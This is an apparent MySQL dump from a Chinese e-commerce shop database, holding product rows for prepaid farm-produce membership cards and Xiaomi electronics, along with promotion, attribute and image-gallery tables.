INSERT INTO `ec22703249_goods` VALUES ('22', '9', 'ESC000018', '乐品卡', '+', '4', '0', '', '80', '0.000', '0.00', '2600.00', '0.00', '0', '0', '1', '', '', '<p>\r\n	<br />\r\n2600元乐品卡<br />\r\n配送有效期：半年&nbsp;&nbsp;&nbsp; <br />\r\n积点数2600<br />\r\n适合家庭：2-3人<br />\r\n热销价：2600元 <br />\r\n套餐介绍&nbsp;\r\n</p>\r\n<p>\r\n	<br />\r\n君禾园是以上海市个人家庭为主要服务对象，由于自然生态种植是建立在有限规模基础上的生产方式。因此，我们设定只服务于600家会员客户。依据个人家庭每周的蔬果消费状况，确定会员卡种类、配送期限及方式。如付款完成，您会收到一张会员储值卡，卡上有您的会员号和初始密码，您可凭此登录我司网站及您的账户；并在你的账户内选购产品；依据您购买的金额，查询您账户内相应的积点数。 我们的产品以点数计价，产品单价公示于网站上。\r\n</p>\r\n<p>\r\n	<br />\r\n特别提醒： 如超过此卡的有效期及相应的延长期限，卡内的金额将被冻结，这是由于当您购买了会员卡，我们就必须按约定的正常需求量进行生产，且农产品的特殊性造成其无法长期存放和再利用，这些都将产生资源浪费，请您谅解。我们会将扣除了实际的生产成本及相关服务费用后的余额退还给您。\r\n</p>', 'images/201407/thumb_img/22_thumb_G_1406222850830.jpg', 'images/201407/goods_img/22_G_1406222850005.jpg', 'images/201407/source_img/22_G_1406222850265.jpg', '0', 'virtual_card', '1', '1', '0', '0', '1406222850', '100', '0', '0', '0', '1', '0', '0', '1406236432', '0', '', '2600', '0', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('23', '9', 'ESC000019', '乐享品', '+', '7', '0', '', '80', '0.000', '0.00', '4800.00', '0.00', '0', '0', '1', '', '', '<p>\r\n	4800元乐享卡\r\n</p>\r\n<p>\r\n	配送有效期：一年     <br />\r\n积点数4800<br />\r\n适合家庭：4-6人<br />\r\n热销价：4800元 <br />\r\n套餐介绍 \r\n</p>\r\n<p>\r\n	<br />\r\n君禾园是以上海市个人家庭为主要服务对象，由于自然生态种植是建立在有限规模基础上的生产方式。因此，我们设定只服务于600家会员客户。依据个人家庭每周的蔬果消费状况，确定会员卡种类、配送期限及方式。如付款完成，您会收到一张会员储值卡，卡上有您的会员号和初始密码，您可凭此登录我司网站及您的账户；并在你的账户内选购产品；依据您购买的金额，查询您账户内相应的积点数。 我们的产品以点数计价，产品单价公示于网站上。\r\n</p>\r\n<p>\r\n	<br />\r\n特别提醒： 如超过此卡的有效期及相应的延长期限，卡内的金额将被冻结，这是由于当您购买了会员卡，我们就必须按约定的正常需求量进行生产，且农产品的特殊性造成其无法长期存放和再利用，这些都将产生资源浪费，请您谅解。我们会将扣除了实际的生产成本及相关服务费用后的余额退还给您。\r\n</p>', 'images/201407/thumb_img/23_thumb_G_1406222920530.jpg', 'images/201407/goods_img/23_G_1406222920591.jpg', 'images/201407/source_img/23_G_1406222920047.jpg', '0', 'virtual_card', '1', '1', '0', '0', '1406222920', '100', '0', '0', '0', '1', '0', '0', '1406236462', '0', '', '4800', '0', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('24', '9', 'ESC000020', '乐活卡', '+', '24', '0', '', '80', '0.000', '11400.00', '9500.00', '0.00', '0', '0', '1', '', '', '<p>\r\n	9500元乐活卡<br />\r\n配送有效期：一年&nbsp;&nbsp;&nbsp;&nbsp; <br />\r\n积点数9500<br />\r\n适合家庭：4-6人\r\n</p>\r\n<p>\r\n	热销价：9500元<br />\r\n套餐介绍&nbsp; 商品评论\r\n</p>\r\n<p>\r\n	<br />\r\n君禾园是以上海市个人家庭为主要服务对象，由于自然生态种植是建立在有限规模基础上的生产方式。因此，我们设定只服务于600家会员客户。依据个人家庭每周的蔬果消费状况，确定会员卡种类、配送期限及方式。如付款完成，您会收到一张会员储值卡，卡上有您的会员号和初始密码，您可凭此登录我司网站及您的账户；并在你的账户内选购产品；依据您购买的金额，查询您账户内相应的积点数。 我们的产品以点数计价，产品单价公示于网站上。\r\n</p>\r\n<p>\r\n	<br />\r\n特别提醒： 如超过此卡的有效期及相应的延长期限，卡内的金额将被冻结，这是由于当您购买了会员卡，我们就必须按约定的正常需求量进行生产，且农产品的特殊性造成其无法长期存放和再利用，这些都将产生资源浪费，请您谅解。我们会将扣除了实际的生产成本及相关服务费用后的余额退还给您。\r\n</p>\r\n<p style=\"background:#ffffff;\" class=\"p15\">\r\n	<span style=\"font-family:\'宋体\';color:#0c0c0c;font-size:10.5pt;\"></span>\r\n</p>', 'images/201407/thumb_img/24_thumb_G_1406223054425.jpg', 'images/201407/goods_img/24_G_1406223054652.jpg', 'images/201407/source_img/24_G_1406223054973.jpg', '0', 'virtual_card', '1', '1', '0', '0', '1406223054', '100', '0', '0', '0', '1', '0', '0', '1406236363', '0', '', '9500', '0', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('12', '1', 'ECS000012', '小米电视', '+', '29', '1', '', '10000', '0.000', '3598.79', '2999.00', '0.00', '0', '0', '1', '', '顶配47英寸，3D智能电视', '<p>顶级LG/三星屏幕<br />\r\n<br />\r\n1920 x 1080 全高清分辨率<br />\r\nLG IPS硬屏 / 三星SPVA屏<br />\r\n<br />\r\nLG与三星是全球液晶面板最顶级的供应商，小米电视<br />\r\n的面板具有178&deg;可视角度，屏幕从几乎任何角度看，<br />\r\n都能呈现出色彩出众的亮丽画面，保证画面色彩更丰<br />\r\n富和节能环保。 </p>', 'images/201402/thumb_img/12_thumb_G_1393531879085.jpg', 'images/201402/goods_img/12_G_1393531879762.jpg', 'images/201402/source_img/12_G_1393531879339.jpg', '1', '', '1', '1', '0', '29', '1393531879', '100', '0', '1', '1', '1', '0', '0', '1393532152', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('13', '1', 'ECS000013', '小米盒子', '+', '16', '1', '', '1000', '0.000', '358.80', '299.00', '0.00', '0', '0', '1', '', '高清网络机顶盒，发烧升级，性能提升4倍', '<p><br />\r\n在电视上看1080p高清电影电视剧<br />\r\n<br />\r\n小米盒子通过未来电视运营的 &ldquo; 中国互联网电视 &rdquo; 集成播控平台，不论是1080p高清热门电影，还是让你痴迷的TVB/美剧/韩剧/<br />\r\n央视电视剧，就连你刚刚错过或想重看一次的精彩赛事、综艺节目，都在无广告的小米新盒子里，随时等你观看。<br />\r\n&nbsp;</p>', 'images/201402/thumb_img/13_thumb_G_1393532004802.jpg', 'images/201402/goods_img/13_G_1393532004412.jpg', 'images/201402/source_img/13_G_1393532004844.jpg', '1', '', '1', '1', '0', '2', '1393532004', '100', '0', '1', '1', '1', '0', '0', '1406251943', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('14', '1', 'ECS000014', '小蜜蜂 手机支架', '+', '24', '1', '', '10000', '0.000', '22.80', '19.00', '0.00', '0', '0', '1', '', '吸盘设计，支持多角度摆放', '<div class=\"bd\">\r\n<div id=\"goodsDesc\" class=\"goods-desc-con\">\r\n<p><img src=\"http://img01.mifile.cn/images/accs/xmf_01.jpg\" alt=\"\" /><img src=\"http://img01.mifile.cn/images/accs/xmf_02.jpg\" alt=\"\" /><img src=\"http://img01.mifile.cn/images/accs/xmf_03.jpg\" alt=\"\" /><img src=\"http://img01.mifile.cn/images/accs/xmf_04.jpg\" alt=\"\" /><img src=\"http://img01.mifile.cn/images/accs/xmf_05.jpg\" alt=\"\" /><img src=\"http://p.www.xiaomi.com/images/1202/xinluzhang02.jpg\" alt=\"\" /><img style=\"width: 720px; height: 871px; \" src=\"http://p.www.xiaomi.com/images/1202/xinliuzhang03.jpg\" alt=\"\" /><img src=\"http://p.www.xiaomi.com/images/1202/xinluzhang04.jpg\" alt=\"\" /></p>\r\n</div>\r\n</div>', 'images/201402/thumb_img/14_thumb_G_1393532143495.jpg', 'images/201402/goods_img/14_G_1393532143711.jpg', 'images/201402/source_img/14_G_1393532143512.jpg', '1', '', '1', '1', '0', '0', '1393532143', '100', '0', '1', '1', '1', '0', '0', '1406251941', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('15', '1', 'ECS000015', '小米活塞耳机简装版', '+', '42', '1', '', '100', '0.000', '118.80', '99.00', '88.00', '1398412800', '1587801600', '1', '', '小米手机听歌必备', '<p>整体表现上，小米活塞耳机是超出我的预期的，比我想象的要好出不少。铝合金腔体、做工还算不错、可以通话、调音走向正确、有品牌，毕竟附带通话功能的它售价不足百元、但音质却超过了很多国产耳机。小米做的这个绝对是良心价格！值得普通用户入手！</p>', 'images/201402/thumb_img/15_thumb_G_1393532283708.jpg', 'images/201402/goods_img/15_G_1393532283019.jpg', 'images/201402/source_img/15_G_1393532283895.jpg', '1', '', '1', '1', '0', '0', '1393532283', '100', '0', '1', '1', '1', '1', '0', '1406251942', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('16', '1', 'ECS000016', '财神米兔', '+', '61', '1', '', '1000', '0.000', '105.60', '88.00', '0.00', '0', '0', '1', '', '最萌的财神，带给你一整年的好财运', '<p><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen1227_01.jpg\" style=\"margin-bottom:20px;\" /><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen1227_03.jpg\" /><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen1227_04.jpg\" /><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen1227_05.jpg\" /><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen1227_06.jpg\" /><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen1227_07.jpg\" /><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen1227_08.jpg\" /><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen1227_09.jpg\" /><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen1227_10.jpg\" /><img alt=\"\" src=\"http://img03.mifile.cn/webfile/images/g/2013/cn/index/caishen121_02.jpg\" /></p>', 'images/201402/thumb_img/16_thumb_G_1393532402180.jpg', 'images/201402/goods_img/16_G_1393532402962.jpg', 'images/201402/source_img/16_G_1393532402576.jpg', '1', '', '1', '1', '0', '0', '1393532402', '100', '0', '1', '1', '1', '0', '0', '1408086196', '0', '', '-1', '-1', '0', '0', null, null);
INSERT INTO `ec22703249_goods` VALUES ('25', '1', '68', '67876', '+', '0', '1', '', '1', '0.000', '0.00', '0.00', '0.00', '0', '0', '1', '', '', '464645654 4564646', '', '', '', '1', '', '1', '1', '0', '0', '1408086298', '100', '0', '0', '0', '0', '0', '0', '1408104012', '0', '', '-1', '-1', '0', null, null, null);

-- ----------------------------
-- Table structure for `ec22703249_goods_activity`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_goods_activity`;
CREATE TABLE `ec22703249_goods_activity` (
  `act_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `act_name` varchar(255) NOT NULL,
  `act_desc` text NOT NULL,
  `act_type` tinyint(3) unsigned NOT NULL,
  `goods_id` mediumint(8) unsigned NOT NULL,
  `product_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_name` varchar(255) NOT NULL,
  `start_time` int(10) unsigned NOT NULL,
  `end_time` int(10) unsigned NOT NULL,
  `is_finished` tinyint(3) unsigned NOT NULL,
  `ext_info` text NOT NULL,
  PRIMARY KEY (`act_id`),
  KEY `act_name` (`act_name`,`act_type`,`goods_id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_goods_activity
-- ----------------------------
INSERT INTO `ec22703249_goods_activity` VALUES ('1', '双口USB充电器lfmartian测试商品', '', '1', '1', '0', '双口USB充电器lfmartian测试商品', '1388908800', '1516867200', '0', 'a:4:{s:12:\"price_ladder\";a:1:{i:0;a:2:{s:6:\"amount\";i:1;s:5:\"price\";d:100;}}s:15:\"restrict_amount\";i:10;s:13:\"gift_integral\";i:10;s:7:\"deposit\";d:10;}');
INSERT INTO `ec22703249_goods_activity` VALUES ('2', '001', '001', '2', '2', '0', 'Adiaos限量T恤（白色L）lfmartian测试商品', '1388908800', '1548835200', '0', 'a:5:{s:7:\"deposit\";d:100;s:11:\"start_price\";d:10;s:9:\"end_price\";i:0;s:9:\"amplitude\";d:10;s:6:\"no_top\";i:1;}');
INSERT INTO `ec22703249_goods_activity` VALUES ('3', '000', '0101', '0', '2', '0', 'Adiaos限量T恤（白色L）lfmartian测试商品', '1388992200', '1485443400', '0', 'a:4:{s:11:\"start_price\";s:4:\"1.00\";s:9:\"end_price\";s:6:\"800.00\";s:9:\"max_price\";s:2:\"10\";s:11:\"cost_points\";s:2:\"10\";}');
INSERT INTO `ec22703249_goods_activity` VALUES ('4', '君禾套餐', '', '4', '0', '0', '', '1407033060', '1409740260', '0', 'a:1:{s:13:\"package_price\";s:3:\"966\";}');
INSERT INTO `ec22703249_goods_activity` VALUES ('5', '套餐2', '', '4', '0', '0', '', '1407033720', '1409740920', '0', 'a:1:{s:13:\"package_price\";s:3:\"369\";}');

-- ----------------------------
-- Table structure for `ec22703249_goods_article`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_goods_article`;
CREATE TABLE `ec22703249_goods_article` (
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `article_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `admin_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`goods_id`,`article_id`,`admin_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_goods_article
-- ----------------------------
INSERT INTO `ec22703249_goods_article` VALUES ('1', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('1', '21', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('1', '22', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('2', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('3', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('4', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('5', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('6', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('7', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('8', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('8', '19', '1');
INSERT INTO `ec22703249_goods_article` VALUES ('9', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('10', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('11', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('12', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('13', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('14', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('15', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('16', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('21', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('22', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('23', '10', '0');
INSERT INTO `ec22703249_goods_article` VALUES ('24', '10', '0');

-- ----------------------------
-- Table structure for `ec22703249_goods_attr`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_goods_attr`;
CREATE TABLE `ec22703249_goods_attr` (
  `goods_attr_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `attr_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `attr_value` text NOT NULL,
  `attr_price` varchar(255) NOT NULL DEFAULT '',
  `thumb_url` varchar(255) NOT NULL,
  `img_url` varchar(80) NOT NULL,
  `img_original` varchar(80) NOT NULL,
  `hex_color` varchar(80) NOT NULL,
  PRIMARY KEY (`goods_attr_id`),
  KEY `goods_id` (`goods_id`),
  KEY `attr_id` (`attr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=88 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_goods_attr
-- ----------------------------
INSERT INTO `ec22703249_goods_attr` VALUES ('46', '10', '186', '1600万', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('45', '10', '184', '100G', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('44', '10', '183', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('43', '10', '182', '苹果', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('42', '10', '181', '10G', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('41', '10', '180', 'GF', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('40', '10', '172', '2008年01月', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('17', '9', '56', '11111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('18', '9', '57', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('19', '9', '60', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('20', '9', '61', '111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('21', '9', '62', '111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('22', '9', '64', '11111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('23', '9', '65', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('24', '9', '66', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('25', '9', '67', '111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('26', '9', '68', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('27', '9', '69', '111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('28', '9', '70', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('29', '9', '71', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('30', '9', '72', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('31', '9', '73', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('32', '9', '74', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('33', '9', '75', '内置', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('34', '9', '76', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('35', '9', '77', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('36', '9', '78', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('37', '9', '79', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('38', '9', '80', '11111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('39', '9', '81', '高价机', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('47', '10', '187', 'TFT', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('48', '10', '188', '320×240 像素', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('49', '10', '189', '屏幕大小', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('50', '10', '190', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('51', '10', '191', '情景模式', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('52', '10', '192', 'USB', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('53', '10', '193', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('54', '10', '194', 'USB', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('55', '10', '195', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('56', '10', '197', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('57', '10', '198', '800万', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('58', '10', '199', '1200万', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('59', '10', '200', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('60', '10', '201', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('61', '10', '202', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('62', '10', '203', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('63', '10', '204', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('64', '10', '205', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('65', '10', '206', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('66', '10', '207', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('67', '10', '208', '支持', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('68', '10', '209', 'UC浏览器', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('69', '10', '185', '黑色', '', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('70', '10', '185', '灰色', '', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('71', '10', '185', '银色', '', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('72', '10', '185', '粉色', '', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('73', '10', '185', '白色', '', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('74', '10', '185', '蓝色', '', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('75', '10', '185', '金色', '', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('76', '10', '211', '150/M', '1', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('77', '10', '211', '160/M', '2', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('78', '10', '211', '170/M', '3', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('79', '10', '211', '180/M', '4', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('80', '10', '173', '双模（GSM,900,1800,CDMA 1X）', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('81', '10', '174', '1111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('82', '10', '175', '111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('83', '10', '176', '111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('84', '10', '177', '111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('85', '10', '178', '滑盖', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('86', '10', '179', '111', '0', '', '', '', '');
INSERT INTO `ec22703249_goods_attr` VALUES ('87', '10', '196', '111', '0', '', '', '', '');

-- ----------------------------
-- Table structure for `ec22703249_goods_cat`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_goods_cat`;
CREATE TABLE `ec22703249_goods_cat` (
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `cat_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`goods_id`,`cat_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_goods_cat
-- ----------------------------
INSERT INTO `ec22703249_goods_cat` VALUES ('25', '28');

-- ----------------------------
-- Table structure for `ec22703249_goods_gallery`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_goods_gallery`;
CREATE TABLE `ec22703249_goods_gallery` (
  `img_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `img_url` varchar(255) NOT NULL DEFAULT '',
  `img_desc` varchar(255) NOT NULL DEFAULT '',
  `thumb_url` varchar(255) NOT NULL DEFAULT '',
  `img_original` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`img_id`),
  KEY `goods_id` (`goods_id`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_goods_gallery
-- ----------------------------
INSERT INTO `ec22703249_goods_gallery` VALUES ('1', '1', 'images/201310/goods_img/1_P_1381080926345.jpg', '', 'images/201310/thumb_img/1_thumb_P_1381080926252.jpg', 'images/201310/source_img/1_P_1381080926252.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('2', '2', 'images/201310/goods_img/2_P_1381081006183.jpg', '', 'images/201310/thumb_img/2_thumb_P_1381081006998.jpg', 'images/201310/source_img/2_P_1381081006625.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('3', '3', 'images/201310/goods_img/3_P_1381081063895.jpg', '', 'images/201310/thumb_img/3_thumb_P_1381081063765.jpg', 'images/201310/source_img/3_P_1381081063245.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('4', '4', 'images/201310/goods_img/4_P_1381081094109.jpg', '', 'images/201310/thumb_img/4_thumb_P_1381081094938.jpg', 'images/201310/source_img/4_P_1381081094741.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('5', '5', 'images/201310/goods_img/5_P_1381081130142.jpg', '', 'images/201310/thumb_img/5_thumb_P_1381081130989.jpg', 'images/201310/source_img/5_P_1381081130258.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('6', '6', 'images/201310/goods_img/6_P_1381081160319.jpg', '', 'images/201310/thumb_img/6_thumb_P_1381081160314.jpg', 'images/201310/source_img/6_P_1381081160107.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('7', '7', 'images/201310/goods_img/7_P_1381081297847.jpg', '', 'images/201310/thumb_img/7_thumb_P_1381081297029.jpg', 'images/201310/source_img/7_P_1381081297356.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('8', '8', 'images/201310/goods_img/8_P_1381081330534.jpg', '', 'images/201310/thumb_img/8_thumb_P_1381081330901.jpg', 'images/201310/source_img/8_P_1381081330400.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('9', '9', 'images/201402/goods_img/9_P_1393470766420.jpg', '', 'images/201402/thumb_img/9_thumb_P_1393470766111.jpg', 'images/201402/source_img/9_P_1393470766410.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('10', '9', 'images/201402/goods_img/9_P_1393521367944.jpg', '', 'images/201402/thumb_img/9_thumb_P_1393521367906.jpg', 'images/201402/source_img/9_P_1393521367159.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('11', '10', 'images/201402/goods_img/10_P_1393522126268.jpg', '', 'images/201402/thumb_img/10_thumb_P_1393522126757.jpg', 'images/201402/source_img/10_P_1393522126095.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('12', '11', 'images/201402/goods_img/11_P_1393531608586.jpg', '', 'images/201402/thumb_img/11_thumb_P_1393531608816.jpg', 'images/201402/source_img/11_P_1393531608068.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('13', '12', 'images/201402/goods_img/12_P_1393531879689.jpg', '', 'images/201402/thumb_img/12_thumb_P_1393531879060.jpg', 'images/201402/source_img/12_P_1393531879789.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('14', '13', 'images/201402/goods_img/13_P_1393532004108.jpg', '', 'images/201402/thumb_img/13_thumb_P_1393532004642.jpg', 'images/201402/source_img/13_P_1393532004061.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('15', '14', 'images/201402/goods_img/14_P_1393532143318.jpg', '', 'images/201402/thumb_img/14_thumb_P_1393532143335.jpg', 'images/201402/source_img/14_P_1393532143338.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('16', '15', 'images/201402/goods_img/15_P_1393532283778.jpg', '', 'images/201402/thumb_img/15_thumb_P_1393532283011.jpg', 'images/201402/source_img/15_P_1393532283180.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('17', '16', 'images/201402/goods_img/16_P_1393532402694.jpg', '', 'images/201402/thumb_img/16_thumb_P_1393532402902.jpg', 'images/201402/source_img/16_P_1393532402644.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('18', '15', 'images/201403/goods_img/15_P_1394560257437.jpg', '', 'images/201403/thumb_img/15_thumb_P_1394560257247.jpg', 'images/201403/source_img/15_P_1394560257750.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('19', '15', 'images/201403/goods_img/15_P_1394560258507.jpg', '', 'images/201403/thumb_img/15_thumb_P_1394560258460.jpg', 'images/201403/source_img/15_P_1394560258264.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('20', '3', 'images/201404/goods_img/3_P_1398450814933.jpg', '', 'images/201404/thumb_img/3_thumb_P_1398450814113.jpg', 'images/201404/source_img/3_P_1398450814417.jpg');
INSERT INTO `ec22703249_goods_gallery` VALUES ('25', '21', 'images/201407/goods_img/21_P_1406222666684.jpg', '', 'images/201407/thumb_img/21_thumb_P_1406222666379.jpg', 'images/201407/source_img/21_P_1406222666728.jpg');
